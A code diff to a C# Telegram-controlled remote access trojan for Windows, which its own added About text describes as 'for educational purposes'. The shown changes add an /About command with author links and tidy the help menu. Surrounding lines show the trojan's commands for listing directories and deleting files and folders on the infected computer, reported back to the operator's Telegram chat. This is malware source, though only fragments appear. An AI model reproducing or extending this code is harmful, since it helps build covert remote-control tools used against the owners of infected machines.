@@ -51,7 +51,6 @@ namespace RAT_BotTelegram {
             Bot.StopReceiving();
             #endregion
         }
-
         private static async void GetDirectoryAll(string path, int indent = 0) {
             try {
                 try {
@@ -70,8 +69,6 @@ namespace RAT_BotTelegram {
                 await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
             }
         }
-
-
         private static async void ListarFiles(string Path) {
             if (Path == "") {
                 SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
@@ -225,6 +222,28 @@ namespace RAT_BotTelegram {
                     Path = "";
                     break;
 
+                case "/About":
+                    string about = 
+                        "<b>Developed by:</b> " +
+                        "\nSebastiánEPH" +
+                        "\n<b>Name: </b>" + @"<a href=""https://github.com/SebastianEPH/RAT_BotTelegram"">RAT_Telegram</a>" + " C#" +
+                        "\n<b>Description:</b>" +
+                        "\nTrojano de acceso remoto para windows. <b>[Fines educativos]</b>" +
+                        "\n<b>Versión:</b> Beta" +
+
+                        "\n<b></b>" +
+                        "\n<b></b>" +
+                        "\n<b>Contact: </b>" +
+                        "\n<b> - "+ @"<a href=""https://github.com/SebastianEPH"">GitHub</a>" + ": </b>"+
+                        "\n<b> - " + @"<a href=""https://t.me/sebastianeph"">Telegram</a>" + ": </b>" +
+                        "\n<b> - " + @"<a href=""https://www.facebook.com/SebastianEPH"">Facebook</a>" + ": </b>" +
+                        "\n<b></b>" +
+                        "<b></b>";
+
+                    await Bot.SendTextMessageAsync(config.ID, about , ParseMode.Html);
+                    await Bot.SendPhotoAsync(chatId: config.ID, photo: "https://i.imgur.com/SelWET0.png");
+                    break;
+
                 //Mensaje por default
                 default:
                     const string usage =
@@ -238,6 +257,8 @@ namespace RAT_BotTelegram {
                   "\n/Delete_OnlyFile <Path> " +                                 // Elimina un archivo
                   "\n/Delete_Folder <Path> " +
                   "\n/Help                    <This menu>" +
+                  "\n\r" +
+                  "\n/About         <This Information>" +
                   "";
                     await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n" , ParseMode.Html );
                     await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
